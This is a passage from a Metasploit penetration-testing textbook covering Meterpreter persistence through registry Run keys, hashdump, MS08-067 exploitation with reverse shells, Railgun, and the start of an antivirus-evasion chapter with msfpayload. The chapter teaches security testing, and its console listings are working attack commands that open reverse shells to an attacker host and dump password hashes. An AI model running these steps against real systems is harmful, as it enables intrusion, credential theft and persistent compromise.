-r 192.168.33.129</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Creating a persistent agent: LHOST=192.168.33.129 LPORT=443 (interval=50 onboot=true) [*] Persistent agent script is 316384 bytes long</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\asSnqrlUDRwO.vbs [*] Agent executed with PID 3160</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\xEYnaHedooc <span class="s30">8</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">[*] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</p><p class="s25" style="padding-left: 53pt;text-indent: 0pt;line-height: 10pt;text-align: left;">xEYnaHedooc</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf&gt; <span class="s24">use multi/handler </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp msf exploit(handler) &gt; <span class="s24">set LPORT 443 </span>LPORT =&gt; 443</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set LHOST 192.168.33.129</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 192.168.33.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 192.168.33.129:443 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (748032 bytes)</p><p class="s25" style="padding-bottom: 2pt;padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">[*] Meterpreter session 2 opened (192.168.33.129:443 -&gt; 192.168.33.130:1120) <span class="s30">@</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_283.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As of this writing, the only way to remove the Meterpreter agent is to delete the registry entry in <span class="s19">HKLM\Software\Microsoft\Windows\CurrentVersion\ Run\ </span>and remove the VBScript located in <span class="s19">C:\WINDOWS\TEMP\ </span>. Be sure to document the registry keys and locations (such as <span class="s19">HKLM\Software\Microsoft\</span></p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;line-height: 81%;text-align: justify;">Windows\CurrentVersion\Run\xEYnaHedooc <span class="s32">8</span><span class="p">) to remove them manually. Gen- erally, you can do this through Meterpreter or drop to a shell and remove it</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">that way. If you feel more comfortable using a GUI, you can use <span class="s25">run vnc </span>and remove the script with <span class="s19">regedit</span>. (Note that the registry keys will change each time, so make sure that you document where Metasploit adds the registry keys.)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark216">Leveraging Post Exploitation Modules</a><a name="bookmark244">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">As mentioned earlier, the Meterpreter scripts are slowly being converted to post exploitation modules. The move to post exploitation modules will finally give a fully consistent standard and format to the Metasploit modules. As you read through later chapters, you’ll see the overall structure of auxiliary mod- ules and exploits. In the past, Meterpreter scripts used their own format, which was very different from the way other modules behaved.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">One added benefit of moving the modules to the same format is the ability to perform the same attack on all sessions available. Suppose, for example, that you have 10 open Meterpreter shells. In the traditional fashion, you would need to run <span class="s25">hashdump </span>on each or write custom scripts to query through each console. In the new format, you would be able to interact with each session and perform the <span class="s25">hashdump </span>on multiple systems if needed.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The next listing shows an example of how to use the post exploitation modules:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_284.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run post/windows/gather/hashdump</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Obtaining the boot key...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Calculating the hboot key using SYSKEY de4b35306c5f595438a2f78f768772d2... [*] Obtaining the user list and keys...</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Decrypting user keys... [*] Dumping password hashes...</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_285.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">To see a list of post exploitation modules, enter the following and then press the <span class="s9">TAB </span>key on your keyboard at the end of the line:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_286.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt; <span class="s24">run post/</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_287.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark217">Upgrading Your Command Shell to Meterpreter</a><a name="bookmark245">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">One of the newer features in the Metasploit Framework is its ability to upgrade a command shell payload to a Meterpreter payload once the system has been exploited, by issuing the <span class="s25">sessions -u </span>command. This is useful if we use a command shell payload as an initial stager and then find that this newly exploited system would make the perfect launching pad for further attacks</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">into the network. Let’s look at a quick example from start to finish using MS08-067 with a reverse command shell as the payload, and upgrade it to a Meterpreter shell.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_288.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfconsole</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">search ms08_067</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Searching loaded modules for pattern &#39;ms08_067&#39;...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Exploits</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">========</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Name Rank Description</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">---- ---- -----------</p><p class="s25" style="padding-left: 53pt;text-indent: -4pt;text-align: left;">windows/smb/ms08_067_netapi great Microsoft Server Service Relative Path Stack Corruption</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use windows/smb/ms08_067_netapi</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set PAYLOAD windows/shell/reverse_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; windows/shell/reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">set TARGET 3</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">target =&gt; 3</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">setg LHOST 192.168.33.129 </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: left;">LHOST =&gt; 192.168.33.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">setg LPORT 8080</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">LPORT =&gt; 8080</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">exploit -z </span><span class="s30">8</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 192.168.33.129:8080 [*] Triggering the vulnerability...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Sending stage (240 bytes)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Command shell session 1 opened (192.168.33.129:8080 -&gt; 192.168.33.130:1032) [*] Session 1 created in the background.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 13pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">sessions -u 1 </span><span class="s30">@</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 192.168.33.129:8080 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Command Stager progress - 3.16% done (1694/53587 bytes) [*] Command Stager progress - 6.32% done (3388/53587 bytes)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Command Stager progress - 97.99% done (52510/53587 bytes) [*] Sending stage (748032 bytes)</p><p class="s25" style="padding-left: 53pt;text-indent: -17pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; [*] Meterpreter session 2 opened (192.168.33.129:8080 -&gt; 192.168.33.130:1044)</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms08_067_netapi) &gt; <span class="s24">sessions -i 2 </span>[*] Starting interaction with 2... meterpreter &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_289.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">At <span class="s32">O </span>we issue the <span class="s25">setg </span>command for <span class="s25">LHOST </span>and <span class="s25">LPORT</span>, which is required in order for the <span class="s25">sessions -u 1 </span>to upgrade to Meterpreter at <span class="s32">@</span>. (The <span class="s25">setg </span>command sets the <span class="s25">LPORT </span>and <span class="s25">LHOST </span>globally in Metasploit, not just for this exploit.)</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 16pt;text-align: left;">Notice at <span class="s32">8 </span>that when we exploit the system we issue the <span class="s25">exploit -z</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">command, which will not interact with the session once the target has been</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">exploited. If you had already executed the <span class="s25">exploit </span>command at this point, you could simply press <span class="s9">CTRL</span>-Z and run the session in the background.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark218">Manipulating Windows APIs with the Railgun Add-On</a><a name="bookmark246">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">You can interface with the Windows native API directly through a Metasploit add-on called <span class="s19">Railgun</span>, which was written by Patrick HVE. By adding Railgun to the Metasploit Framework, you can natively call Windows APIs through Meterpreter, all through the Windows API. For example, in the following listing, we’ll drop into an interactive Ruby shell (<span class="s25">irb</span>), available through Meterpreter. The <span class="s25">irb </span>shell allows us to interact directly with Meterpreter through Ruby-based syntax. We call Railgun in this example and create a simple pop-up box saying “hello world”.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_290.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">irb</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting IRB shell</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] The &#39;client&#39; variable holds the meterpreter client</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&gt;&gt; client.railgun.user32.MessageBoxA(0,&quot;hello&quot;,&quot;world&quot;,&quot;MB_OK&quot;)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_291.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">On our target Windows XP machine, you should see a pop-up box with <span class="s19">world </span>in the title bar and <span class="s19">hello </span>in the message box. In this example, we simply called the <span class="s19">user32.dll </span>and the <span class="s25">MessageBoxA </span>function, which takes the parameters as shown.</p><p class="s22" style="padding-top: 9pt;padding-left: 30pt;text-indent: 0pt;text-align: center;">NOTE     <a href="http://msdn.microsoft.com/" class="s20" target="_blank">For a list of all documented API calls, visit </a><a href="http://msdn.microsoft.com/" class="s31" target="_blank">http://msdn.microsoft.com/</a><a href="http://msdn.microsoft.com/" class="s20" target="_blank">.</a></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We won’t cover Railgun in detail (you can find a tutorial within the Framework directory under <span class="s19">external/source/meterpreter/source/extensions/stdapi/ server/railgun/</span>), but this gives you an idea of its power.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The implications are huge: Railgun gives you the same capabilities as a native Win32 application with full access to the Windows API.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark219">Wrapping Up</a><a name="bookmark247">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Hopefully, you’re now pretty comfortable with Meterpreter. We haven’t gone through every Meterpreter flag and option, because we expect your knowl- edge of Meterpreter to grow as you experiment and use it. Meterpreter is a continuously evolving tool with an enormous amount of support for scripts and additions. Once you become comfortable with the overall interface, you will be able to master anything new. In Chapter 16, you will learn how to cre- ate your own Meterpreter scripts from scratch and how the overall structure of a Meterpreter script is designed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 232pt;text-indent: 0pt;text-align: left;"><span><img width="70" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_292.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 144pt;text-indent: 0pt;text-align: left;"><a name="bookmark248">AVOIDING DE TECTION </a><a name="bookmark257">&zwnj;</a><a name="bookmark258">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-top: 15pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When you are performing a penetration test, nothing is more embarrassing than being caught by antivirus soft- ware. This is one of those little details that can be over- looked quite easily: If you don’t make plans to evade detection by antivirus software, watch out, because your</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">target will quickly be alerted that something fishy is going on. In this chapter, we’ll cover situations in which antivirus software might be an issue and discuss possible solutions.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Most antivirus software uses <span class="s19">signatures </span>to identify aspects of malicious code that are present in a sampling of malicious software. These signatures are loaded into antivirus engines and then used to scan disk storage and run- ning processes for matches. When a match is found, the antivirus software takes certain steps to respond to the situation: Most quarantine the binary or kill the running process.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">As you might imagine, this model has scaling issues. For one, the amount of malicious code in the wild means that an antivirus product loaded with signatures can check files only so quickly for matching signatures. Also, the</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">signatures must be specific enough to trigger only when they encounter truly malicious programs, not legitimate software. This model is relatively easy to implement, yet it provides limited success in practice.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">That being said, a lot of money is being made by antivirus publishers, and many smart and talented people work in the industry. If you plan to use a payload that is not custom built, you can expect that antivirus software will detect it.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">To evade antivirus, we can create unique payloads to run on an antivirus software–protected system that will not match any of the available signatures. In addition, when we’re performing direct exploits on a system, Metasploit payloads are designed to run in memory and never to write data to the hard disk. When we send a payload as part of an exploit, most antivirus programs will not detect that it has been run on the target.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Rather than focus on specific commands in this chapter, we’ll focus on the underlying concepts. Consider the sorts of characteristics that might trig- ger antivirus software, and try to use the techniques presented here to change sections of code so that they no longer match the antivirus signatures. Don’t be afraid to experiment.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark249">Creating Stand-Alone Binaries with MSFpayload</a><a name="bookmark259">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Before we perform an antivirus evasion, let’s look at how to create stand- alone Metasploit binary payloads with <span class="s19">msfpayload</span>. For starters, we’ll create a simple reverse shell that connects back to the attacker and spawns a command shell. We’ll use <span class="s25">msfpayload </span>and <span class="s25">windows/shell_reverse_tcp</span>. But first, let’s look at</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 15pt;text-align: left;">the available options for the <span class="s25">shell_reverse_tcp </span>payload using the <span class="s25">O </span>flag at <span class="s32">O</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_293.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">root@bt:/# <span class="s24">msfpayload windows/shell_reverse_tcp O </span><span class="s30">O</span></p><p class="s24" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Basic options:</p><table style="border-collapse:collapse;margin-left:90.4996pt" cellspacing="0"><tr style="height:16pt"><td style="width:43pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:176pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:39pt"><td style="width:43pt;border-top-style:dashed;border-top-width:1pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-top: 4pt;padding-right: 7pt;text-indent: 0pt;text-align: left;">EXITFUNC LHOST LPORT</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;text-align: left;">process</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s28" style="text-indent: 0pt;text-align: left;">4444</p></td><td style="width:9pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-top: 4pt;padding-right: 21pt;text-indent: 0pt;text-align: justify;">yes yes yes</p></td><td style="width:8pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:176pt;border-top-style:dashed;border-top-width:1pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-top: 4pt;padding-right: 22pt;text-indent: 0pt;text-align: left;">Exit technique: seh, thread, process The local address</p><p class="s28" style="text-indent: 0pt;line-height: 11pt;text-align: left;">The local port</p></td></tr></table><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: left;">Now let’s run <span class="s25">msfpayload </span>again and provide the options needed to create this payload in the Windows Portable Executable (PE) format. To do so, we provide the <span class="s25">X </span>option as shown at <span class="s32">O </span>as our output format:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_294.png"/></span></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><span class="s25">root@bt:/# </span>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 X <span class="s30">O </span>&gt;</p><p class="s24" style="padding-left: 53pt;text-indent: 0pt;line-height: 9pt;text-align: left;">/var/www/payload1.exe</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/# <span class="s24">file /var/www/payload1.exe</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">var/www/payload1.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_295.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now we have a working executable, so we can start a listener with the <span class="s19">multi/handler </span>module in <span class="s19">msfconsole</span>. <span class="s19">multi/handler </span>allows Metasploit to listen for reverse connections.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_296.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use exploit/multi/handler </span><span class="s30">O</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 13pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">show options </span><span class="s30">8</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Payload options (windows/meterpreter/reverse_tcp):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:103.22pt" cellspacing="0"><tr style="height:16pt"><td style="width:43pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:15pt"><td style="width:43pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">EXITFUNC</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">process</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Exit technique: seh, thread, process</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">LHOST</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">192.168.1.101</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">The local address</p></td></tr><tr style="height:10pt"><td style="width:43pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">LPORT</p></td><td style="width:63pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">4444</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The local port</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 14pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set PAYLOAD windows/shell_reverse_tcp </span><span class="s30">@</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">PAYLOAD =&gt; windows/shell_reverse_tcp</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set LHOST 192.168.1.101 </span><span class="s30">O</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">LHOST =&gt; 192.168.1.101</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(handler) &gt; <span class="s24">set LPORT 31337 </span><span class="s30">@</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">LPORT =&gt; 31337</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(handler) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_297.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 77%;text-align: justify;">We first use the <span class="s19">multi/handler </span>module at <span class="s32">O </span>and get a quick display of the options at <span class="s32">8</span>. Then, we set 